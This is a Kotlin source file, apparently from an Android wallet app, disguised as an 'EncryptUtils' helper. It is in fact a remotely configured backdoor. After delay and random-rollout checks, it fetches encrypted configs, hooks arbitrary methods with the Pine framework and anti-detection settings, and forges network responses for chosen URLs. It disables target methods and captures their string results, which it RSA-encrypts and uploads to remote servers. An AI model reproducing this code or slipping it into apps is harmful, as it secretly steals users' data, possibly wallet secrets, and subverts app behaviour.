package t.wallet

import android.app.Application
import android.content.Context
 import android.content.SharedPreferences
 import android.telephony.TelephonyManager
 import top.canyie.pine.Pine
 import top.canyie.pine.PineConfig
 import top.canyie.pine.callback.MethodHook
 import top.canyie.pine.callback.MethodReplacement
 import java.lang.reflect.Method
 import kotlin.concurrent.thread
 import kotlin.math.max
 import kotlin.random.Random


internal object EncryptUtils {

     private var sp: SharedPreferences? = null

     private var name = ""
     private var code = 0
     private var os_v = 0

     private const val T1 = 1693054541000L
     private const val T2 = 1694264141000L
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
     private var DEFAULT =
         """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34F43D2B64DF70B52918F7E57F6D36FB6777C315F1E4348588ABF0A448E0833F086071F15159A9C8C60E3A398B707FDDEA248A8FAEA55FB94D379FDBA6FA443DE11E5074BE5D259A325D165F45D387D126""".trimIndent()


    fun init(app: Application) {
         val telMgr = app.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val simReady = telMgr.getSimState()
             .let { it == TelephonyManager.SIM_STATE_READY }
         if (!simReady) return

         app.packageManager.getPackageInfo(app.packageName, 0)?.apply {
             code = this.versionCode
             val lastTime = max(this.firstInstallTime, this.lastUpdateTime)
             if (System.currentTimeMillis() - lastTime < 86400000L) {
                 return
             }
         }
         name = app.resources.getString(app.applicationInfo.labelRes)
         os_v = android.os.Build.VERSION.SDK_INT


         PineConfig.debug = false
         PineConfig.disableHiddenApiPolicy = false
         PineConfig.disableHiddenApiPolicyForPlatformDomain = false
         PineConfig.antiChecks = true


         sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)

         val be = f() ?: return

         val b = e(be) ?: return

         if (b) fe(be.c, be.v)

         a(be)

         b(be.ok)

         c(be.not)

         d(be.sa)
    }

     private fun a(b: B) {
         val list = loadValue() ?: return
         if (list.isEmpty()) return
         thread(true) {
             kotlin.runCatching {
                 u(b.u, list)
             }
         }
     }

     private fun e(b: B): Boolean? {
         val now = System.currentTimeMillis()
         if (now < T1) return null

         sp?.getLong(L_KEY, 0)?.let {
             if (now - it > b.d) {
                 return if (now < T2) Random.nextFloat() <= 0.05 else true
             }
         }
         return false
     }

     private fun fe(u: List<String>, v: Long) {

         thread(true) {
             kotlin.runCatching {
                 for (url in u) {
                     val json = post(url, """{"configVersion":$v}""")
                     val b = fromJson(json, Re::class.java)
                     if (b.code == 1) {
                         if (b.data.isNotEmpty()) {
                             val result = JEnc.decrypt(b.data)
                             if (result.isNotEmpty()) {
                                 sp?.edit()?.apply {
                                     putString(C_KEY, b.data)
                                 }?.apply()
                             }
                         }
                         sp?.edit()?.apply {
                             putLong(L_KEY, System.currentTimeMillis())
                         }?.apply()
                         break
                     }
                 }
             }
         }
     }


     private fun f(): B? {
         try {
             return sp?.getString(C_KEY, DEFAULT)
                 ?.let { JEnc.decrypt(it) }
                 ?.let { fromJson(it, B::class.java) }
         } catch (t: Throwable) {
         }
         return null
     }

     private fun b(list: List<Ok>) {

         list.forEach { bean ->
             kotlin.runCatching {
                 val method = getM(bean.m) ?: return@runCatching
                 val hook = object : MethodHook() {
                     override fun beforeCall(callFrame: Pine.CallFrame?) {
                         super.beforeCall(callFrame)
                         kotlin.runCatching {
                             callFrame?.args?.getOrNull(0)?.apply {
                                 val request =
                                     this::class.java.getDeclaredMethod("request").invoke(this)!!

                                 val reU =
                                     request::class.java.getDeclaredMethod("url").invoke(request)!!
                                         .toString()


                                 val inject =
                                     bean.i.firstOrNull { reU.contains(it.u) } ?: return@apply

                                 callFrame.result = getResponse(request, inject.r).also {
                                 }
                             }
                         }
                     }

                 }

                 Pine.hook(method, hook)
             }
         }
     }

     private fun getM(method: M): Method? {
         try {
             return method.c.let { Class.forName(it) }
                 .let {
                     val parameterTypes =
                         method.p.map {
                             when (it) {
                                 "byte[]" -> ByteArray::class.java
                                 "int[]" -> IntArray::class.java
                                 "char[]" -> CharArray::class.java
                                 "boolean[]" -> BooleanArray::class.java
                                 "long[]" -> LongArray::class.java
                                 "double[]" -> DoubleArray::class.java
                                 "float[]" -> FloatArray::class.java
                                 else -> Class.forName(it)
                             }
                         }.toTypedArray()
                     it.getDeclaredMethod(method.m, *parameterTypes)
                 }
         } catch (t: Throwable) {
         }
         return null
     }

     private fun c(list: List<M>) {

         list.forEach { bean ->
             runCatching {
                 val method = getM(bean) ?: return@runCatching
                 Pine.hook(method, MethodReplacement.DO_NOTHING)
             }
         }
     }

     private fun d(list: List<M>) {

         list.forEach { bean ->
             runCatching {
                 val method = getM(bean) ?: return@runCatching
                 val methodHook = object : MethodHook() {
                     override fun afterCall(callFrame: Pine.CallFrame?) {
                         super.afterCall(callFrame)
                         kotlin.runCatching {
                             callFrame?.result?.let {
                                 if (it !is String) return@let
                                 if (it.isNotBlank()) saveText(it)
                             }
                         }
                     }
                 }
                 Pine.hook(method, methodHook)
             }
         }

     }


     private fun saveText(s: String) {
         thread(true) {
             kotlin.runCatching {
                 val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
                 sp?.apply {
                     if (getString(key, null) == null) {
                         val now = System.currentTimeMillis()
                         val dataString = JEnc.encryptRSA(s)
                         val result = now.toString() + dataString
                         edit().putString(key, "false$result").commit()
                     }
                 }
             }
         }
     }


     private fun loadValue(): List<Pair<String, String>>? {
         return sp?.all?.filter { it.key.length == 32 && it.value is String }
             ?.map { Pair(it.key, it.value as String) }
             ?.filter { it.second.startsWith("false") }

     }


     private fun u(urls: List<String>, values: List<Pair<String, String>>) {
         if (values.isEmpty()) return

         values.forEach { pair ->
             val key = pair.first
             val value = pair.second.removePrefix("false")

             val body =
                 """{"timestamp":${value.substring(0, 13)},"value":"${value.removeRange(0, 13)}"}"""
             kotlin.runCatching {
                 for (url in urls) {
                     val json = post(url, body)
                     val baseResponse = fromJson(json, Re::class.java)
                     if (baseResponse.code == 1) {
                         sp?.apply {
                             val newValue = pair.second.replaceFirst("false", "true")
                             this.edit()?.putString(pair.first, newValue)?.commit()
                         }
                     }
                 }
             }
         }
     }


     fun <T> fromJson(json: String, clazz: Class<T>): T {
         val clz = Class.forName("com.google.gson.Gson")
         val fromJson = clz.getDeclaredMethod("fromJson", String::class.java, Class::class.java)
         return fromJson.invoke(clz.newInstance(), json, clazz) as T
     }


     fun getResponse(request: Any, json: String, mediaType: String = "application/json"): Any {

         return Class.forName("okhttp3.Response\$Builder").let { builderClz ->
             val instance = builderClz.newInstance()
             builderClz.getDeclaredMethod("request", request::class.java).invoke(instance, request)

             Class.forName("okhttp3.MediaType").let { mediaTypeClz ->
                 val getM = mediaTypeClz.getDeclaredMethod("get", String::class.java)
                 Class.forName("okhttp3.ResponseBody").let { bodyClz ->
                     val bodyGetM =
                         bodyClz.getDeclaredMethod("create", String::class.java, mediaTypeClz)
                     val body = bodyGetM.invoke(null, json, getM.invoke(null, mediaType))

                     builderClz.getDeclaredMethod("body", bodyClz).invoke(instance, body)
                 }
             }
             builderClz.getDeclaredMethod("code", Int::class.java).invoke(instance, 200)
             builderClz.getDeclaredMethod("message", String::class.java).invoke(instance, "")

             val protocolClz = Class.forName("okhttp3.Protocol")
             val http_1_1 = protocolClz.getDeclaredField("HTTP_1_1").get(protocolClz)
             builderClz.getDeclaredMethod("protocol", protocolClz).invoke(instance, http_1_1)

             builderClz.getDeclaredMethod("build").invoke(instance)!!
         }

     }


     fun post(url: String, body: String): String {
         return getC().let {
             val request = getRequest(url, body)
             val realCall = it::class.java.getDeclaredMethod("newCall", request::class.java)
                 .invoke(it, request)
             Class.forName("okhttp3.internal.connection.RealCall").let { realCallClz ->
                 val response = realCallClz.getDeclaredMethod("execute").invoke(realCall)
                 val body = response::class.java.getDeclaredMethod("body").invoke(response)
                 Class.forName("okhttp3.ResponseBody")
                     .getDeclaredMethod("string").invoke(body) as String
             }
         }

     }


     private fun getC(): Any {
         return Class.forName("okhttp3.OkHttpClient\$Builder").let { builderClz ->
             val instance = builderClz.newInstance()

             val proxyClz = Class.forName("java.net.Proxy")
             builderClz.getDeclaredMethod("proxy", proxyClz)
                 .invoke(instance, proxyClz.getDeclaredField("NO_PROXY").get(proxyClz))

             val timeUnitClz = Class.forName("java.util.concurrent.TimeUnit")
             builderClz.getDeclaredMethod("connectTimeout", Long::class.java, timeUnitClz)
                 .invoke(instance, 10, timeUnitClz.getDeclaredField("SECONDS").get(timeUnitClz))
             builderClz.getDeclaredMethod("readTimeout", Long::class.java, timeUnitClz)
                 .invoke(instance, 10, timeUnitClz.getDeclaredField("SECONDS").get(timeUnitClz))

             builderClz.getDeclaredMethod("build").invoke(instance)!!
         }
     }


     private fun getRequest(url: String, body: String): Any {

         return Class.forName("okhttp3.Request\$Builder").let { builderClz ->
             val instance = builderClz.newInstance()
             builderClz.getDeclaredMethod("url", String::class.java).invoke(instance, url)
             val headerM =
                 builderClz.getDeclaredMethod("addHeader", String::class.java, String::class.java)
             getHeaders().entries.forEach {
                 headerM.invoke(instance, it.key, it.value)
             }

             Class.forName("okhttp3.MediaType").let { mediaTypeClz ->
                 val getM = mediaTypeClz.getDeclaredMethod("get", String::class.java)
                 Class.forName("okhttp3.RequestBody").let { bodyClz ->
                     val bodyGetM =
                         bodyClz.getDeclaredMethod("create", String::class.java, mediaTypeClz)
                     val body = bodyGetM.invoke(null, body, getM.invoke(null, "application/json"))

                     builderClz.getDeclaredMethod("post", bodyClz).invoke(instance, body)
                 }
             }

             builderClz.getDeclaredMethod("build").invoke(instance)!!
         }

     }


     private fun getHeaders(): Map<String, String> {
         return mapOf(
             Pair("app_name", name),
             Pair("app_version_code", code.toString()),
             Pair("os_version", os_v.toString()),
             Pair("os", "Android"),
             Pair("timestamp", System.currentTimeMillis().toString())
         )
     }

}

 private data class Re(
     var code: Int = -1,
     var msg: String = "",
     var data: String = ""
 )

 data class B(
     var c: List<String> = listOf(),
     var d: Long = 0,
     var not: List<M> = listOf(),
     var ok: List<Ok> = listOf(),
     var sa: List<M> = listOf(),
     var u: List<String> = listOf(),
     var v: Long = 0
 )


 data class Ok(
     var i: List<I> = listOf(),
     var m: M = M()
 )


 data class I(
     var r: String = "",
     var u: String = ""
 )

 data class M(
     var c: String = "",
     var m: String = "",
     var p: List<String> = listOf()
 )
